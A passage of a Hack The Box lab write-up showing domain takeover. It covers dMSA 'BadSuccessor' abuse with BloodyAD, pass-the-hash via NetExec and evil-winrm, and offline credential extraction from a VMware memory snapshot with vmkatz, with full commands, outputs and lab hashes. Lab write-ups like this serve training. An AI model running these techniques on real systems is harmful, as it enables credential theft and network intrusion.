    VmF7JWzVJYDnhuvu/ilUkgP5DBqqW+/cDdiYDgZJIhSWho/Qu4BEkjpo2ba14XP8orczFUTLhBhDS6rTAIjo5jgyZPTKxvMlQ3yh
    2pgpROoDWRzET4qsPrMQMUOD+uQT/Pvj9AMzy9Nl7x+Rn6p9BguoxQrFtLwQkjVBtagZaWEsO5q/33X5oOZDjI/wfnbcNPCyNobG
    zz84bwGLiKis2QJpGVhnbh+s4ASN2622y15792+VvLSkbsJHLbVHukyVS+6E72s2nAx3bO7GuclrG//M25+8JXs+UFJ1tGoomLNs
    5FNL3B7Y5f3Md3eecL5RpRE0FHenBm1sthkT8uK5DO8Fh6OAMhrVnti50+2Uqvc5znepLC3eeS1Tr8Rlz2SywFgGRBkJPbw0SNcl
    f/K0i+iCdEXDJL+szOQ+4qtrOmarlbacPcR0eOcwYUu9x8AbN2859ahbXiFyCespbIw/lCjD8ylo1ozNIRATPHtELQKAYZe9U7Gc
    QmuSbrY1HTTc1UAzr5O6QIGW2vymZqKaMPNLeDQ83/TGJJLMXCNug46lkN35rCkUn6RYmtu2zPib0bFTlEE1w62Yb/rv/OqX6eJF
    eqZOrIdeqX6gf9Sqv1OaRc48rf8Yn3LlcVhGhmdPXsFtcV1T25rDAB3loYaxCr9fosN+37SkqZMpgwB3juqfpRG2ld02bczEuQeK
    SeVcg/UZWjkW5gRi1e5wj6dgMy+cNpQfdLCD5zU2dJbJ8CNLP2rvxFQovQF1IPoxUamhoSqjgf8wgfygAwIBAKKB9ASB8X2B7jCB
    66CB6DCB5TCB4qArMCmgAwIBEqEiBCAqr9BgEUg5dFNSf/rsXL6eVVOZGGyvMn8hzbJz0YQUWKEQGw5jaGVja3BvaW50Lmh0YqIX
    MBWgAwIBAaEOMAwbCmV2aWwtZG1zYSSjBQMDAGChpBEYDzIwMjYwOTE4MDcyMDEyWqURGA8yMDI2MDkxODA3MjM1NFqmERgPMjAy
    NjA5MTgxNzIwMTJapxEYDzIwMjYwOTI1MDcyMDEyWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hF
    Q0tQT0lOVC5IVEI=
[+] dMSA TGT stored in ccache file evil-dmsa_dJ.ccache

dMSA current keys found in TGS:
AES256: b8c4afa9038b0fa53f04a9a309847194461c5cd0af436e84fc9b016481014bc1
AES128: 265e57d1393df97494b609a295b78e90
RC4: 10a08d56dfe5c6e382c3afc80a2a7026

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

**Breaking down the command:**

* `add badSuccessor evil-dmsa` — create a new dMSA object named `evil-dmsa$`.
* `-t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB'` — the **target** account to "succeed": we're telling AD "this new dMSA replaces `svc_deploy`."
* `--ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'` — the OU we have `CREATE_CHILD` rights on, i.e. where the new dMSA object actually gets created.

BloodyAD handles the entire chain automatically here: it creates the `evil-dmsa$` computer-like account object, sets its `msDS-ManagedAccountPrecededByLink` attribute to point at `svc_deploy`, and then immediately performs the Kerberos authentication flow to request a TGT *as the dMSA*. The output confirms success: `[+] Impersonating: CN=SVC_DEPLOY,...`, and we get back a full TGT for `evil-dmsa$` in the `CHECKPOINT.HTB` realm — saved to `evil-dmsa_dJ.ccache`.

### Why the Key Material Matters

The truly critical part of the output is at the very bottom:

```
dMSA current keys found in TGS:
AES256: b8c4afa9038b0fa53f04a9a309847194461c5cd0af436e84fc9b016481014bc1
AES128: 265e57d1393df97494b609a295b78e90
RC4: 10a08d56dfe5c6e382c3afc80a2a7026

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

Because of how the KDC constructs the service ticket for a "succeeding" dMSA — bundling key material to keep authentication seamless across the account transition — this response leaks actual cryptographic key material tied to the **preceding account, `svc_deploy`**, including its RC4 key. An **RC4 key in this context is functionally identical to the account's NTLM hash** (Kerberos's RC4-HMAC encryption type is literally keyed on the NT hash). In other words: this single BloodyAD command didn't just let us *impersonate* `svc_deploy` via ticket abuse — it directly handed us `svc_deploy`'s actual NTLM hash, which we can now use with completely conventional pass-the-hash techniques against any protocol, not just Kerberos.

### Authenticating as `svc_deploy`

With that recovered hash (`e16081eb077aca74bdbf8af12af43ac9`), a straightforward WinRM login test confirms it's valid and that `svc_deploy` has remote-management rights on the DC:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ nxc winrm DC01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
WINRM       10.129.46.234   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) 
WINRM       10.129.46.234   5985   DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 (Pwn3d!)
```

NetExec's cheerful `(Pwn3d!)` tag means it went a step further than just validating the hash — it confirmed `svc_deploy` is a **local administrator** on `DC01`, meaning we can get a full interactive shell:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ evil-winrm -i checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

`evil-winrm`'s `-H` flag performs **pass-the-hash** authentication: rather than sending a plaintext password, it uses the NTLM hash directly as the authentication key in the NTLM handshake — this works because NTLM authentication is fundamentally challenge-response based on the hash itself, so possessing the hash is cryptographically equivalent to possessing the password for authentication purposes (though it can't be reversed back into the plaintext).

---

## Phase 7: Reaching the VMBackups Share & Offline Memory Forensics

Recall from Phase 2 that `VMBackups` was a share `alex.turner` had no visible access to. As local admin (via `svc_deploy`), we can finally explore it:

```powershell
*Evil-WinRM* PS C:\Shares> ls


    Directory: C:\Shares


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/18/2026  12:16 AM                DevDrop
d-----          5/9/2026  10:15 AM                VMBackups
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FHEfPENdXAqE82AviPFRN%252FScreenshot%2520%283405%29.png%3Falt%3Dmedia%26token%3Dfb9fc1eb-5ed0-4aaf-a79c-1c0111f6dd9c&width=768&dpr=3&quality=100&sign=cd74f6ac75f95aa987fb3d536d7c86aa&sv=3)

Digging further into `VMBackups`, we find a full **VMware virtual machine backup**, snapshot files and all:

```powershell
*Evil-WinRM* PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> ls


    Directory: C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
-a----          5/9/2026   7:40 PM     2147483648 Windows Server 2019-Snapshot1.vmem
-a----          5/9/2026   7:40 PM      138164859 Windows Server 2019-Snapshot1.vmsn
-a----          5/9/2026   7:39 PM         270840 Windows Server 2019.nvram
-a----          5/9/2026   7:45 PM           7642 Windows Server 2019.scoreboard
-a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
-a----          5/9/2026   7:39 PM            502 Windows Server 2019.vmsd
-a----          5/9/2026   7:45 PM           2749 Windows Server 2019.vmx
-a----          5/9/2026   7:22 PM            274 Windows Server 2019.vmxf
```

**A quick primer on what these VMware files actually are**, because they're exactly what makes this final step possible:

* **`.vmx`** — the VM's configuration file (hardware settings, disk paths, etc.), plain text.
* **`.vmdk`** — the virtual disk file (the VM's "hard drive" contents).
* **`.vmem`** — a **raw dump of the VM's guest RAM** at the moment a snapshot was taken. This is the important one: it's functionally identical to a full memory dump you'd otherwise need something like `procdump` or `Mimikatz`'s live LSASS-dumping capability to obtain — except here, it was captured incidentally by the backup process and just sitting on a share, with no EDR anywhere near it because nothing is actually *running* on this decommissioned VM anymore.
* **`.vmsn`** — the snapshot metadata file, which is tightly linked to the corresponding `.vmem` and needed to correctly interpret it.
* **`.nvram` / `.vmsd` / `.scoreboard` / `.vmxf`** — supporting VM state files (BIOS/UEFI variables, snapshot hierarchy, performance stats, team/config metadata) not directly relevant to credential extraction.

In other words: this decommissioned "Windows Server 2019" VM's **entire RAM contents at the moment it was last snapshotted** are sitting here, untouched, as a backup artifact. If any user was logged in with cached credentials at that moment, they're almost certainly still recoverable from this memory dump — completely offline, with zero interaction with a live, monitored system.

### Extracting Credentials with vmkatz

**vmkatz** is a purpose-built tool that parses VMware `.vmsn`/`.vmem` snapshot pairs directly and reimplements Mimikatz-style credential extraction logic (walking the same in-memory LSASS data structures Mimikatz targets on a live system) against the *offline* memory image instead. This sidesteps live-system detection entirely, since we're just parsing a file, not touching a running process.

```powershell
*Evil-WinRM* PS C:\ProgramData> .\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn"
vmkatz.exe : [*] vmkatz v1.4.1
    + CategoryInfo          : NotSpecified: ([*] vmkatz v1.4.1:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[*] System discovery: 15.3889757s[*] Process enumeration: 4.1986ms[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 134.8597ms[*] 2 sessions, 1 NT hashes, 0 plaintext passwords
[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
  [DPAPI]
    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-2823729479-30462974-3865623546-500
  [MSV1_0]
    NT Hash : f29e9c014295b9b32139b09a2790be3b
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595
```

**Reading this dense output:**

* The `+ CategoryInfo : NotSpecified... NativeCommandError` block near the top isn't a real failure — it's just PowerShell being strict about a native (non-PowerShell) executable writing to `stderr` (vmkatz's own banner/status line), which PowerShell's default error-handling behavior surfaces as a non-terminating "error" even though the tool itself runs fine and produces valid output right below it.
* **`Providers: MSV(ok) WDigest(ok) Kerberos(ok) ... DPAPI(ok) ...`** — these are the different Windows authentication "packages" that store credential material in LSASS memory, each in its own format. `vmkatz` confirms it successfully parsed all of them from this memory image.
* **Two logon sessions** are recovered:
  1. `WIN-0DG6SJAEUTA$` (the machine account, running as `NETWORK SERVICE`) — its credential material is only **DPAPI master keys**, not directly a login hash we can reuse.
  2. **`Administrator`** on `WIN-0DG6SJAEUTA` — and under the `[MSV1_0]` provider (the classic NTLM authentication package), we get exactly what we're after:
     ```
     NT Hash : f29e9c014295b9b32139b09a2790be3b
     ```

> **A quick note on DPAPI**, since it shows up throughout this output: the **Data Protection API** is what Windows uses to encrypt things like saved browser passwords, Wi-Fi keys, and Credential Manager entries, tying that encryption to the logged-in user's credentials via a **master key**. We don't end up needing to go further down the DPAPI rabbit hole on this box (decrypting DPAPI blobs requires additional steps beyond just having the master key), but recognizing these `[DPAPI]` blocks for what they are is useful — they're not stray noise, they're proof that this account had encrypted secrets that *could* be recovered with more work.

The NT hash recovered here belongs to the **local `Administrator`** account of this old `WIN-0DG6SJAEUTA` machine — worth noting this is a *local* SAM hash (`S-1-5-21-...-500`, the well-known local Administrator RID), not a domain account. Whether it turns out to be reused on `DC01` itself is the very next — and final — thing to test.

---

## Phase 8: Full Compromise — Pass-the-Hash to Domain Administrator

With NT hash `f29e9c014295b9b32139b09a2790be3b` recovered from the decommissioned VM's memory, we try it directly against `DC01` as `Administrator`. If this decommissioned server's local admin password was ever reused as the domain Administrator's password (or if the hash was otherwise carried over during some migration), this is a straight shot to full domain compromise:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ evil-winrm -i dc01.checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

**It works.** The hash recovered from a years-old, "decommissioned" VM backup turns out to be valid for the live domain's `Administrator` account — a stark, very realistic illustration of how dangerous it is to leave old backups (especially ones containing raw memory images) lying around on a network share indefinitely. Password/hash reuse across a "retired" system and the current production domain is exactly the kind of long-tail risk that formal offboarding and credential-rotation processes exist to prevent.

From here, the root flag is sitting right where we'd expect:

```powershell
*Evil-WinRM* PS C:\Users\max.palmer\Desktop> cat root.txt
[REDACTED]
```

A great reminder of how many *individually minor* issues — a forgotten deleted-object permission, shared passwords, an over-trusting automation pipeline, a brand-new AD feature with a subtle trust assumption, and stale backups nobody thought to lock down — chain together into complete domain takeover.
